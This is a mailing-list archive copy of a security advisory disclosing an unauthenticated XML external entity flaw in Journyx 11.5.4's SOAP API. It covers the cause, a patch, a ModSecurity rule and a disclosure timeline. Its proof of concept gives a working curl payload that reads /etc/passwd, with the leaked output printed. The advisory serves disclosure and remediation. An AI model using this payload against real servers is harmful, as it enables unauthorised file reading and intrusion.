---
title: KL-001-2024-010: Journyx Unauthenticated XML External Entities Injection
url: https://seclists.org/fulldisclosure/2024/Aug/8
source: Full Disclosure
date: 2024-08-08
fetch_date: 2025-10-06T18:08:47.226858
---

# KL-001-2024-010: Journyx Unauthenticated XML External Entities Injection

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](7)
[By Date](date.html#8)
[![Next](/images/right-icon-16x16.png)](9)

[![Previous](/images/left-icon-16x16.png)](7)
[By Thread](index.html#8)
[![Next](/images/right-icon-16x16.png)](9)

![](/shared/images/nst-icons.svg#search)

# KL-001-2024-010: Journyx Unauthenticated XML External Entities Injection

---

*From*: KoreLogic Disclosures via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Wed, 7 Aug 2024 18:54:52 -0500

---

```
KL-001-2024-010: Journyx Unauthenticated XML External Entities Injection

Title: Journyx Unauthenticated XML External Entities Injection
Advisory ID: KL-001-2024-010
Publication Date: 2024.08.07
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2024-010.txt

1. Vulnerability Details

     Affected Vendor: Journyx
     Affected Product: Journyx (jtime)
     Affected Version: 11.5.4
     Platform: GNU/Linux
     CWE Classification: CWE-611: Improper Restriction of XML External Entity
                         Reference
     CVE ID: CVE-2024-6893

2. Vulnerability Description

     The "soap_cgi.pyc" API handler allows the XML body of
     SOAP requests to contain references to external entities.
     This allows an unauthenticated attacker to read local files,
     perform server-side request forgery, and overwhelm the web
     server resources.

3. Technical Description

    From an unauthenticated perspective, a user can send an HTTP
    request to the "/jtcgi/soap_cgi.pyc" endpoint.  The body of the
    HTTP request is read and processed by the Journyx web server
    as XML.

    To process these SOAP requests, the third-party component
    "SOAPpy" is used. The built-in XML parser for "SOAPpy"
    is "xml.sax". According to the "xml.sax" documentation
    (https://docs.python.org/3/library/xml.sax.html), versions
    before 3.7.1 enable XML external entities by default. Since
    Journyx version 11.5.4 ships with python 3.6, the SOAP API
    endpoint is vulnerable.

4. Mitigation and Remediation Recommendation

     The vendor reports that this issue was remediated in Journyx
     v13.0.0, which is the first wholly cloud-hosted version of
     this product.

     For self-hosted versions of Journyx, external entity processing
     can be disabled by editing the old bundled version of SOAPpy by
     modifying the "Parser.py" file:

       --- Parser.py.orig      2018-11-27 17:26:53.000000000 -0500
       +++ Parser.py   2024-06-18 10:56:01.993019226 -0400
       @@ -1036,6 +1036,10 @@
            # turn on namespace mangeling
            parser.setFeature(xml.sax.handler.feature_namespaces, 1)

       +    # Disallow external entities, prevent XXE
       + parser.setFeature(xml.sax.handler.feature_external_ges, 0)
       + parser.setFeature(xml.sax.handler.feature_external_pes, 0)
       +
            try:
                parser.parse(inpsrc)
            except xml.sax.SAXParseException as e:

     Additionally, if API access is not required, requests to
     /jtcgi/soap_cgi.pyc could be dropped without forwarding to FastCGI
     via a ModSecurity rule like the one below:

       SecRule REQUEST_URI "@contains soap_cgi" "id:1,phase:2,deny,log,auditlog"

5. Credit

     This vulnerability was discovered by Jaggar Henry of KoreLogic, Inc.

6. Disclosure Timeline

     2024.01.31 - KoreLogic notifies Journyx support of the intention to
                  report vulnerabilities discovered in the licensed,
                  on-premises version of the product.
     2024.01.31 - Journyx acknowledges receipt.
     2024.02.02 - KoreLogic requests a meeting with Journyx support to share
                  vulnerability details.
     2024.02.07 - KoreLogic reports vulnerability details to Journyx.
     2024.02.09 - Journyx responds that this vulnerability has been remediated
                  in the cloud-hosted version of the product.
     2024.02.21 - KoreLogic offers to test the cloud version to confirm
                  the fix; no response.
     2024.07.01 - KoreLogic notifies Journyx of impending public disclosure.
     2024.07.09 - Journyx confirms version number of the remediation.
     2024.08.07 - KoreLogic public disclosure.

7. Proof of Concept

    The "changeUserPassword" SOAP method will reflect the
    "username" parameter in the HTTP response if the given
    username does not exist in the Journyx database. This
    makes exploitation straight forward, as an external
    entity can be used as the value of "username" and the
    dynamic value of the entity is reflected in the page
    response.

    [attacker@box]$ python xxe.py --host redacted.com --port 8080
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    ...
    [attacker@box]$

    [attacker@box]$ HOST='redacted.com'; PORT='8080'; PAYLOAD_TARGET='file:///etc/passwd'; \
```

    curl -X POST --data-binary '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM
"'$PAYLOAD\_TARGET'">]><soapenv:Envelope
xmlns:soapenv="[http://schemas.xmlsoap.org/soap/envelope/"](http://schemas.xmlsoap.org/soap/envelope/%22);><soapenv:Header/><soapenv:Body><changeUserPassword><username>&test;</username><curpwd>zzz</curpwd><newpwd>zzz123</newpwd></changeUserPassword></soapenv:Body></soapenv:Envelope>'
\
    -s "[http://$HOST:$PORT/jtcgi/soap\_cgi.pyc"](http://$HOST:$PORT/jtcgi/soap_cgi.pyc%22); | awk '/incorrect or invalid password for user
/{flag=1;next}/<\/faultstring>/{flag=0}flag'

```
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    ...
    [attacker@box]$

The contents of this advisory are copyright(c) 2024
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/

KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html

Our public vulnerability disclosure policy is available at:
https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy
```

**Attachment:
[OpenPGP\_signature.asc](att-8/OpenPGP_sign...